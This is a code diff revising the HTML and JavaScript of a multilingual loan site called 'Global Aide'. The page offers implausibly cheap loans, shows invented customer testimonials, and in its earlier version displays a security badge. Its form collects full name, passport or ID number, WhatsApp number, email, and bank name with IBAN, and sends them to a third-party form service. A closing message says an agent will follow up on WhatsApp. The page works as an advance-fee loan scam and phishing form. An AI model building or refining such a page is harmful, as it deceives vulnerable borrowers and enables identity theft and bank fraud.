@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Aide | Finance Innovative 2026</title>
+    <title>Global Aide | Finance 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -12,152 +12,127 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
         .lang-btn.selected { 
-            border-color: #fbbf24; 
-            background-color: rgba(255,255,255,0.2); 
+            border: 3px solid #fbbf24 !important; 
+            background-color: rgba(255,255,255,0.2) !important;
             transform: scale(1.05);
-            box-shadow: 0 0 15px rgba(251,191,36,0.5);
         }
         
         .slider { -webkit-appearance: none; width: 100%; height: 8px; border-radius: 5px; background: #cbd5e1; outline: none; }
-        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        
-        input[type=number]::-webkit-inner-spin-button, 
-        input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
-
-        .progress-dot.active { background-color: #fbbf24; box-shadow: 0 0 10px #fbbf24; }
+        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; }
     </style>
 </head>
-<body class="bg-slate-50 font-sans text-slate-900 overflow-x-hidden">
+<body class="bg-slate-50 font-sans text-slate-900">
 
     <div id="nav-progress" class="hidden fixed top-0 left-0 w-full h-1.5 bg-slate-200 z-[100]">
-        <div id="progress-bar" class="h-full bg-blue-600 transition-all duration-500" style="width: 33%"></div>
+        <div id="progress-bar" class="h-full bg-blue-600 transition-all duration-500" style="width: 0%"></div>
     </div>
 
-    <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center bg-gradient-to-br from-blue-900 to-blue-800 text-white p-6 relative">
-        <div class="flex-grow flex flex-col justify-center items-center w-full">
-            <div class="text-center mb-8">
-                <div class="w-20 h-20 bg-white/10 rounded-3xl flex items-center justify-center mx-auto mb-6 backdrop-blur-lg border border-white/20 shadow-lg">
-                    <i class="fas fa-globe-americas text-4xl text-yellow-400"></i>
-                </div>
-                <h1 class="text-4xl font-black tracking-tighter uppercase mb-2">Global Aide</h1>
-                <p class="opacity-70 text-sm font-medium tracking-wide">Financial Inclusion Program</p>
+    <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center bg-gradient-to-br from-blue-900 to-blue-800 text-white p-6">
+        <div class="text-center mb-10">
+            <div class="w-20 h-20 bg-white/10 rounded-3xl flex items-center justify-center mx-auto mb-6 border border-white/20 shadow-lg">
+                <i class="fas fa-globe-americas text-4xl text-yellow-400"></i>
             </div>
-
-            <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-24">
-                <button onclick="selectLang('fr', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold transition-all text-center flex flex-col items-center gap-2" id="btn-fr"><span class="text-2xl">🇫🇷</span> <span>Français</span></button>
-                <button onclick="selectLang('en', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold transition-all text-center flex flex-col items-center gap-2" id="btn-en"><span class="text-2xl">🇺🇸</span> <span>English</span></button>
-                <button onclick="selectLang('es', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold transition-all text-center flex flex-col items-center gap-2" id="btn-es"><span class="text-2xl">🇪🇸</span> <span>Español</span></button>
-                <button onclick="selectLang('de', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold transition-all text-center flex flex-col items-center gap-2" id="btn-de"><span class="text-2xl">🇩🇪</span> <span>Deutsch</span></button>
-            </div>
+            <h1 class="text-4xl font-black uppercase mb-2">Global Aide</h1>
+            <p class="opacity-70 text-sm font-medium">International Support Program</p>
         </div>
 
-        <div class="fixed bottom-8 left-0 w-full px-6 flex justify-center z-50">
-            <button id="lang-continue" onclick="goToStep(2)" class="hidden w-full max-w-sm bg-yellow-400 text-blue-900 py-4 rounded-xl font-black text-xl shadow-2xl hover:scale-105 transition-all flex items-center justify-center gap-3">
-                <span id="btn-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
+        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-12">
+            <button onclick="selectLang('fr', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-fr">
+                <span class="text-2xl">🇫🇷</span> <span>Français</span>
+            </button>
+            <button onclick="selectLang('en', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-en">
+                <span class="text-2xl">🇺🇸</span> <span>English</span>
+            </button>
+            <button onclick="selectLang('es', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-es">
+                <span class="text-2xl">🇪🇸</span> <span>Español</span>
+            </button>
+            <button onclick="selectLang('de', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-de">
+                <span class="text-2xl">🇩🇪</span> <span>Deutsch</span>
             </button>
         </div>
+
+        <button id="lang-continue" onclick="goToStep(2)" class="hidden w-full max-w-sm bg-yellow-400 text-blue-900 py-5 rounded-2xl font-black text-xl shadow-2xl flex items-center justify-center gap-3 animate-bounce">
+            <span id="btn-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
+        </button>
     </section>
 
-    <section id="step-sim" class="step min-h-screen flex-col p-4 md:p-8">
-        <div class="max-w-5xl mx-auto w-full">
+    <section id="step-sim" class="step min-h-screen flex-col p-4">
+        <div class="max-w-xl mx-auto w-full pt-6">
             <div class="flex justify-between items-center mb-8">
-                <div class="font-black text-xl text-blue-700">GLOBAL AIDE</div>
-                <button onclick="goToStep(1)" class="text-xs font-bold text-slate-400 bg-white px-3 py-2 rounded-lg shadow-sm">
-                    <i class="fas fa-language mr-1"></i> Langue
-                </button>
+                <div class="font-black text-blue-700">GLOBAL AIDE</div>
+                <button onclick="goToStep(1)" class="text-xs font-bold text-slate-400 border px-2 py-1 rounded">Langue</button>
             </div>
 
-            <div class="text-center mb-8">
-                <h2 class="text-3xl font-black text-blue-900 mb-2" id="sim-title">Simulation</h2>
-                <p class="text-slate-500 text-sm font-medium" id="hero-sub">Taux 3% • Différé 3 mois</p>
+            <div class="text-center mb-6">
+                <h2 class="text-2xl font-black text-blue-900" id="sim-title">Simulation</h2>
+                <p class="text-slate-500 text-xs" id="hero-sub">Taux 3% • Premier paiement dans 3 mois</p>
             </div>
 
-            <div class="bg-white p-6 rounded-[2.5rem] shadow-xl border border-blue-50 mb-8 relative">
-                <div id="min-alert" class="hidden absolute top-4 left-1/2 -translate-x-1/2 bg-red-100 text-red-600 px-4 py-1 rounded-full text-xs font-black animate-pulse">
-                    ⚠️ Minimum <span class="min-val">1 000</span>
-                </div>
-
-                <div class="mb-10">
-                    <div class="flex justify-between items-end mb-4 font-black text-slate-700">
+            <div class="bg-white p-6 rounded-[2rem] shadow-xl border border-blue-50 mb-6">
+                <div class="mb-8">
+                    <div class="flex justify-between items-end mb-2 font-black text-slate-700">
                         <span id="lbl-amt">Montant</span>
-                        <div class="flex items-center border-b-2 border-blue-200 focus-within:border-blue-700">
-                            <input type="number" id="amountInput" value="5000" min="1000" max="500000" onchange="validateMinAmount()" oninput="syncInputs('number')" class="text-3xl font-black text-blue-700 w-32 text-right bg-transparent outline-none">
-                            <span class="curr text-3xl font-black text-blue-700 ml-1">€</span>
+                        <div class="flex items-center border-b-2 border-blue-200">
+                            <input type="number" id="amountInput" value="5000" min="1000" onchange="validateMin()" oninput="sync('amt')" class="text-2xl font-black text-blue-700 w-24 text-right bg-transparent outline-none">
+                            <span class="curr ml-1 text-2xl text-blue-700 font-black">€</span>
                         </div>
                     </div>
-                    <input type="range" min="1000" max="500000" step="1000" value="5000" class="slider" id="amountRange" oninput="syncInputs('range')">
+                    <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="5000" oninput="sync('range')" class="slider">
                 </div>
 
-                <div class="mb-10">
-                    <div class="flex justify-between items-end mb-4 font-black text-slate-700">
-                        <span id="lbl-dur">Durée de remboursement</span>
-                        <div class="flex items-center border-b-2 border-blue-200 focus-within:border-blue-700">
-                            <input type="number" id="yearInput" value="3" min="2" max="30" oninput="syncYears('number')" class="text-3xl font-black text-blue-700 w-16 text-right bg-transparent outline-none">
-                            <span id="lbl-years" class="text-xl font-black text-blue-700 ml-2">Ans</span>
+                <div class="mb-8">
+                    <div class="flex justify-between items-end mb-2 font-black text-slate-700">
+                        <span id="lbl-dur">Durée</span>
+                        <div class="flex items-center border-b-2 border-blue-200">
+                            <input type="number" id="yearInput" value="3" min="2" max="30" oninput="syncYear('num')" class="text-2xl font-black text-blue-700 w-12 text-right bg-transparent outline-none">
+                            <span id="lbl-years" class="ml-1 text-xl text-blue-700 font-black">Ans</span>
                         </div>
                     </div>
-                    <input type="range" min="2" max="30" step="1" value="3" class="slider" id="yearRange" oninput="syncYears('range')">
+                    <input type="range" id="yearRange" min="2" max="30" step="1" value="3" oninput="syncYear('range')" class="slider">
                 </div>
 
-                <div class="bg-blue-900 text-white p-6 rounded-3xl shadow-2xl">
-                    <div class="flex justify-between items-center opacity-80 mb-2">
-                        <span id="res-lbl-men" class="text-sm">Mensualité :</span> 
-                        <span id="res-monthly" class="text-3xl font-black text-green-400">144 €</span>
+                <div class="bg-blue-900 text-white p-6 rounded-2xl shadow-lg">
+                    <div class="flex justify-between opacity-80 mb-2">
+                        <span id="res-lbl-men">Mensualité :</span> 
+                        <span id="res-monthly" class="text-xl font-black text-green-400">144 €</span>
                     </div>
-                    <div class="flex justify-between items-center border-t border-white/10 pt-2 mb-4">
-                        <span id="res-lbl-tot" class="text-sm">Total :</span> 
+                    <div class="flex justify-between border-t border-white/10 pt-2 mb-4">
+                        <span id="res-lbl-tot">Total :</span> 
                         <span id="res-total" class="font-bold">5150 €</span>
                     </div>
-                    <button onclick="simulateLoading()" class="w-full bg-yellow-400 text-blue-900 py-4 rounded-xl font-black uppercase shadow-lg flex justify-center items-center gap-2" id="btn-next">
-                        <span>Suivant</span>
-                    </button>
+                    <button onclick="goToStep(3)" class="w-full bg-yellow-400 text-blue-900 py-4 rounded-xl font-black uppercase" id="btn-next">Suivant</button>
                 </div>
             </div>
 
-            <div id="testimonials-container" class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
-                </div>
+            <div id="testi" class="space-y-3"></div>
         </div>
     </section>
 
     <section id="step-form" class="step min-h-screen flex-col p-4 bg-slate-100">
-        <div class="max-w-3xl mx-auto w-full">
-            <button onclick="goToStep(2)" class="mb-6 text-blue-700 font-bold flex items-center gap-2"><i class="fas fa-arrow-left"></i> <span id="btn-back">Retour</span></button>
-            
-            <div class="bg-white p-6 rounded-[2.5rem] shadow-xl">
-                <h2 class="text-2xl font-black text-blue-900 mb-6" id="form-title">Contact</h2>
-                
+        <div class="max-w-xl mx-auto w-full pt-6">
+            <button onclick="goToStep(2)" class="mb-4 text-blue-700 font-bold"><i class="fas fa-arrow-left"></i> <span id="btn-back">Retour</span></button>
+            <div class="bg-white p-6 rounded-[2rem] shadow-xl">
+                <h2 class="text-xl font-black text-blue-900 mb-6" id="form-title">Contact</h2>
                 <form action="https://formspree.io/f/xnjqwngo" method="POST" class="space-y-4" id="loanForm">
-                    <input type="hidden" name="Montant_Calcule" id="hidden-montant">
-                    <input type="hidden" name="Duree_Annees" id="hidden-annees">
-                    
-                    <div>
-                        <label class="text-xs font-bold uppercase text-slate-400 ml-2" id="lbl-pays">Pays</label>
-                        <select id="country-select" name="Pays" onchange="updateCountryData()" class="w-full p-4 bg-slate-50 rounded-xl font-bold border border-slate-200">
-                            <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
-                            <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
-                            <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
-                            <option value="Ecuador" data-code="+593" data-curr="$">🇪🇨 Ecuador</option>
-                            <option value="Salvador" data-code="+503" data-curr="$">🇸🇻 Salvador</option>
-                            <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
-                        </select>
-                    </div>
-
-                    <input type="text" id="input-nom" name="Nom" placeholder="Nom Complet" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200">
-                    <input type="text" id="input-id" name="ID" placeholder="N° ID / Passeport" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200">
-                    
+                    <input type="hidden" name="Montant" id="h-m">
+                    <input type="hidden" name="Duree" id="h-d">
+                    <select id="country-select" name="Pays" onchange="updateCountryData()" class="w-full p-4 bg-slate-50 rounded-xl font-bold border">
+                        <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
+                        <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
+                        <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
+                        <option value="Ecuador" data-code="+593" data-curr="$">🇪🇨 Ecuador</option>
+                        <option value="Salvador" data-code="+503" data-curr="$">🇸🇻 Salvador</option>
+                        <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
+                    </select>
+                    <input type="text" id="i-nom" name="Nom" required class="w-full p-4 bg-slate-50 rounded-xl border">
+                    <input type="text" id="i-id" name="ID" required class="w-full p-4 bg-slate-50 rounded-xl border">
                     <div class="flex gap-2">
                         <span id="phone-prefix" class="p-4 bg-slate-200 rounded-xl font-bold text-slate-600">+33</span>
-                        <input type="tel" id="input-wa" name="WhatsApp" placeholder="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200">
+                        <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border">
                     </div>
-
-                    <input type="email" id="input-email" name="Email" placeholder="Email" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200">
-                    <textarea id="input-bank" name="Banque" placeholder="Banque & IBAN" required class="w-full p-4 bg-slate-50 rounded-xl h-24 border border-slate-200"></textarea>
-
-                    <button type="submit" class="w-full bg-blue-700 text-white p-5 rounded-xl font-black text-xl shadow-lg hover:bg-blue-800 transition-all mt-4" id="btn-submit">ENVOYER</button>
-                    
-                    <div class="text-center mt-4 text-xs text-slate-400 flex justify-center items-center gap-2">
-                        <i class="fas fa-lock text-green-500"></i> SSL Secure 256-bit Encryption
-                    </div>
+                    <input type="email" id="i-email" name="Email" required class="w-full p-4 bg-slate-50 rounded-xl border">
+                    <textarea id="i-bank" name="Banque" required class="w-full p-4 bg-slate-50 rounded-xl h-24 border"></textarea>
+                    <button type="submit" class="w-full bg-blue-700 text-white p-5 rounded-xl font-black text-xl" id="btn-submit">ENVOYER</button>
                 </form>
             </div>
         </div>
@@ -167,154 +142,90 @@
         let currentLang = 'fr';
         let currentCurrency = '€';
 
-        // SYNC MONTANT
-        function syncInputs(source) {
-            const range = document.getElementById('amountRange');
-            const number = document.getElementById('amountInput');
-            if (source === 'range') number.value = range.value;
-            else range.value = number.value;
-            calculateLoan();
-        }
-
-        // SYNC ANNÉES
-        function syncYears(source) {
-            const range = document.getElementById('yearRange');
-            const number = document.getElementById('yearInput');
-            if (source === 'range') number.value = range.value;
-            else range.value = number.value;
-            calculateLoan();
-        }
-
-        // VALIDATION MINIMUM 1000
-        function validateMinAmount() {
-            const num = document.getElementById('amountInput');
-            const alertBox = document.getElementById('min-alert');
-            if (parseInt(num.value) < 1000) {
-                num.value = 1000;
-                syncInputs('number');
-                alertBox.classList.remove('hidden');
-                setTimeout(() => alertBox.classList.add('hidden'), 3000);
-            }
-        }
-
         const translations = {
-            fr: { 
-                cont: "CONTINUER", sim: "Simulation", sub: "Taux fixe 3% • Différé 3 mois", amt: "Montant", dur: "Durée de remboursement", yr: "Ans", men: "Mensualité :", tot: "Total :", next: "Suivant", fTitle: "Informations", back: "Retour", submit: "ENVOYER LE DOSSIER", pays: "Pays",
-                pl_nom: "Nom Complet", pl_id: "N° Passeport / CNI", pl_wa: "Numéro WhatsApp", pl_email: "Votre Email", pl_bank: "Nom Banque & IBAN", thanks: "Reçu ! Un agent vous contactera sur WhatsApp.",
-                tests: [
-                    {n: "Marc L.", l: "🇫🇷", t: "Prêt de 5000€ reçu en 48h. Très sérieux."},
-                    {n: "Julie D.", l: "🇫🇷", t: "Le taux de 3% est incroyable, merci Global Aide."}
-                ]
-            },
-            en: { 
-                cont: "CONTINUE", sim: "Simulation", sub: "3% Fixed Rate • 3 Months Grace Period", amt: "Amount", dur: "Repayment Period", yr: "Years", men: "Monthly:", tot: "Total:", next: "Next", fTitle: "Information", back: "Back", submit: "SEND REQUEST", pays: "Country",
-                pl_nom: "Full Name", pl_id: "Passport ID", pl_wa: "WhatsApp Number", pl_email: "Your Email", pl_bank: "Bank Name & Account Number", thanks: "Received! Agent will contact you on WhatsApp.",
-                tests: [
-                    {n: "John D.", l: "🇺🇸", t: "Fast process. 3% rate is much better than banks."},
-                    {n: "Sarah K.", l: "🇺🇸", t: "Professional and honest service. Highly recommended."}
-                ]
-            },
-            es: { 
-                cont: "CONTINUAR", sim: "Simulación", sub: "Tasa fija 3% • Pago en 3 meses", amt: "Monto", dur: "Plazo de reembolso", yr: "Años", men: "Mensualidad:", tot: "Total:", next: "Siguiente", fTitle: "Información", back: "Atrás", submit: "ENVIAR SOLICITUD", pays: "País",
-                pl_nom: "Nombre Completo", pl_id: "N° Pasaporte / DNI", pl_wa: "Número WhatsApp", pl_email: "Su Correo", pl_bank: "Banco y Número de Cuenta", thanks: "¡Recibido! Le contactaremos por WhatsApp.",
-                tests: [
-                    {n: "Carlos R.", l: "🇵🇷", t: "Excelente apoyo financiero desde Puerto Rico."},
-                    {n: "Elena P.", l: "🇵🇦", t: "El proceso en Panamá fue muy rápido. ¡Gracias!"}
-                ]
-            },
-            de: { 
-                cont: "WEITER", sim: "Kreditrechner", sub: "3% Zins • 3 Monate Aufschub", amt: "Betrag", dur: "Laufzeit", yr: "Jahre", men: "Monatlich:", tot: "Gesamt:", next: "Weiter", fTitle: "Informationen", back: "Zurück", submit: "ANTRAG SENDEN", pays: "Land",
-                pl_nom: "Vollständiger Name", pl_id: "Reisepass Nr.", pl_wa: "WhatsApp Nummer", pl_email: "Ihr Email", pl_bank: "Bank & IBAN", thanks: "Empfangen! Kontakt über WhatsApp.",
-                tests: [
-                    {n: "Hans M.", l: "🇩🇪", t: "Sehr niedrige Zinsen. Schnelle Auszahlung."},
-                    {n: "Ingrid S.", l: "🇩🇪", t: "Kompetent und vertrauenswürdig."}
-                ]
-            }
+            fr: { cont: "CONTINUER", sim: "Simulation", sub: "Taux fixe 3%", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité:", tot: "Total:", next: "Suivant", fTitle: "Contact", back: "Retour", submit: "ENVOYER", pl_nom: "Nom Complet", pl_id: "ID / Passeport", pl_wa: "WhatsApp", pl_email: "Email", pl_bank: "Banque & IBAN", thanks: "Merci ! Contact sous 24h.", tests: ["Marc L. (🇫🇷): Très rapide.", "Julie D. (🇫🇷): Recommandé."] },
+            en: { cont: "CONTINUE", sim: "Simulation", sub: "3% Fixed Rate", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly:", tot: "Total:", next: "Next", fTitle: "Contact", back: "Back", submit: "SEND", pl_nom: "Full Name", pl_id: "ID / Passport", pl_wa: "WhatsApp", pl_email: "Email", pl_bank: "Bank & Account", thanks: "Thanks! Contact in 24h.", tests: ["John D. (🇺🇸): Very fast.", "Sarah K. (🇺🇸): Recommended."] },
+            es: { cont: "CONTINUAR", sim: "Simulación", sub: "Tasa fija 3%", amt: "Monto", dur: "Plazo", yr: "Años", men: "Mensualidad:", tot: "Total:", next: "Siguiente", fTitle: "Contacto", back: "Atrás", submit: "ENVIAR", pl_nom: "Nombre Completo", pl_id: "ID / Pasaporte", pl_wa: "WhatsApp", pl_email: "Correo", pl_bank: "Banco y Cuenta", thanks: "¡Gracias! Contacto en 24h.", tests: ["Carlos R. (🇵🇷): Muy rápido.", "Elena P. (🇵🇦): Excelente."] },
+            de: { cont: "WEITER", sim: "Simulation", sub: "3% Festzins", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich:", tot: "Gesamt:", next: "Weiter", fTitle: "Kontakt", back: "Zurück", submit: "SENDEN", pl_nom: "Vollständiger Name", pl_id: "Ausweis Nr.", pl_wa: "WhatsApp", pl_email: "Email", pl_bank: "Bank & IBAN", thanks: "Danke! Kontakt in 24h.", tests: ["Hans M. (🇩🇪): Sehr schnell.", "Ingrid S. (🇩🇪): Empfohlen."] }
         };
 
         function selectLang(lang, currency) {
             currentLang = lang;
             currentCurrency = currency;
-            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('selected'));
+            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected'));
             document.getElementById('btn-' + lang).classList.add('selected');
             document.getElementById('btn-text').innerText = translations[lang].cont;
-            document.getElementById('lang-continue').classList.remove('hidden');
-            updateContent(lang);
+            document.getElementById('lang-continue').style.display = 'flex'; // Forcer l'affichage
+            updateUI(lang);
         }
 
-        function goToStep(stepNumber) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            const steps = [null, 'step-lang', 'step-sim', 'step-form'];
-            document.getElementById(steps[stepNumber]).classList.add('active');
-            
-            // Barre de progression
+        function goToStep(s) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            const ids = [null, 'step-lang', 'step-sim', 'step-form'];
+            document.getElementById(ids[s]).classList.add('active');
             document.getElementById('nav-progress').classList.remove('hidden');
-            document.getElementById('progress-bar').style.width = (stepNumber * 33.33) + "%";
-            
+            document.getElementById('progress-bar').style.width = (s * 33) + "%";
             window.scrollTo(0,0);
         }
 
-        function simulateLoading() {
-            const btn = document.getElementById('btn-next');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i> Checking...';
-            setTimeout(() => {
-                btn.innerHTML = originalText;
-                goToStep(3);
-            }, 1000);
+        function sync(src) {
+            const r = document.getElementById('amountRange'), n = document.getElementById('amountInput');
+            if(src === 'range') n.value = r.value; else r.value = n.value;
+            calculate();
         }
 
-        function updateContent(lang) {
+        function syncYear(src) {
+            const r = document.getElementById('yearRange'), n = document.getElementById('yearInput');
+            if(src === 'range') n.value = r.value; else r.value = n.value;
+            calculate();
+        }
+
+        function validateMin() {
+            const n = document.getElementById('amountInput');
+            if(n.value < 1000) { n.value = 1000; sync('num'); alert("Minimum 1.000"); }
+        }
+
+        function updateUI(lang) {
             const t = translations[lang];
-            const safeSetText = (id, text) => { const el = document.getElementById(id); if(el) el.innerText = text; };
+            const set = (id, txt) => { if(document.getElementById(id)) document.getElementById(id).innerText = txt; };
+            set('sim-title', t.sim); set('hero-sub', t.sub); set('lbl-amt', t.amt); set('lbl-dur', t.dur);
+            set('lbl-years', t.yr); set('res-lbl-men', t.men); set('res-lbl-tot', t.tot); set('btn-next', t.next);
+            set('form-title', t.fTitle); set('btn-back', t.back); set('btn-submit', t.submit);
             
-            safeSetText('sim-title', t.sim); safeSetText('hero-sub', t.sub); safeSetText('lbl-amt', t.amt);
-            safeSetText('lbl-dur', t.dur); safeSetText('lbl-years', t.yr); safeSetText('res-lbl-men', t.men);
-            safeSetText('res-lbl-tot', t.tot); document.querySelector('#btn-next span').innerText = t.next;
-            safeSetText('form-title', t.fTitle); safeSetText('btn-back', t.back); safeSetText('btn-submit', t.submit);
-            safeSetText('lbl-pays', t.pays);
-
-            document.getElementById('input-nom').placeholder = t.pl_nom;
-            document.getElementById('input-id').placeholder = t.pl_id;
-            document.getElementById('input-wa').placeholder = t.pl_wa;
-            document.getElementById('input-email').placeholder = t.pl_email;
-            document.getElementById('input-bank').placeholder = t.pl_bank;
-
-            // Témoignages
-            const container = document.getElementById('testimonials-container');
-            container.innerHTML = t.tests.map(test => `
-                <div class="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 flex items-start gap-4">
-                    <div class="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center text-blue-600 font-bold text-xs">
-                        ${test.n.split(' ').map(x => x[0]).join('')}
-                    </div>
-                    <div>
-                        <p class="italic text-slate-600 text-xs mb-1">"${test.t}"</p>
-                        <span class="font-bold text-xs text-blue-800">${test.n} ${test.l}</span>
-                    </div>
-                </div>
-            `).join('');
-
-            document.getElementById('loanForm').onsubmit = function() { alert(t.thanks); return true; };
-
-            const countrySelect = document.getElementById('country-select');
-            if(lang === 'es') countrySelect.value = "Porto Rico"; 
-            else if(lang === 'en') countrySelect.value = "USA"; 
-            else countrySelect.value = "France";
+            document.getElementById('i-nom').placeholder = t.pl_nom;
+            document.getElementById('i-id').placeholder = t.pl_id;
+            document.getElementById('i-wa').placeholder = t.pl_wa;
+            document.getElementById('i-email').placeholder = t.pl_email;
+            document.getElementById('i-bank').placeholder = t.pl_bank;
+            
+            document.getElementById('testi').innerHTML = t.tests.map(x => `<div class="bg-white p-3 rounded-xl shadow-sm text-xs italic border border-slate-100">${x}</div>`).join('');
+            
+            const sel = document.getElementById('country-select');
+            if(lang === 'es') sel.value = "Porto Rico"; else if(lang === 'en') sel.value = "USA"; else sel.value = "France";
             updateCountryData();
         }
 
-        function calculateLoan() {
-            const amount = parseInt(document.getElementById('amountInput').value) || 1000;
-            const years = parseInt(document.getElementById('yearInput').value) || 2;
-            
-            const total = Math.round(amount + (amount * 0.03));
-            const monthly = Math.round(total / (years * 12));
+        function calculate() {
+            const a = parseInt(document.getElementById('amountInput').value) || 1000;
+            const y = parseInt(document.getElementById('yearInput').value) || 2;
+            const tot = Math.round(a + (a * 0.03));
+            const mon = Math.round(tot / (y * 12));
+            document.getElementById('res-total').innerText = new Intl.NumberFormat().format(tot) + " " + currentCurrency;
+            document.getElementById('res-monthly').innerText = new Intl.NumberFormat().format(mon) + " " + currentCurrency;
+            document.getElementById('h-m').value = a + " " + currentCurrency;
+            document.getElementById('h-d').value = y + " ans";
+            document.querySelectorAll('.curr').forEach(el => el.innerText = currentCurrency);
+        }
 
-            document.getElementById('res-total').innerT
+        function updateCountryData() {
+            const o = document.getElementById('country-select').options[document.getElementById('country-select').selectedIndex];
+            document.getElementById('phone-prefix').innerText = o.getAttribute('data-code');
+            currentCurrency = o.getAttribute('data-curr');
+            calculate();
+        }
+
+        window.onload = () => calculate();
+    </script>
+</body>
+                </html>
                             
-    
-    
-    
-    
-        
-                    
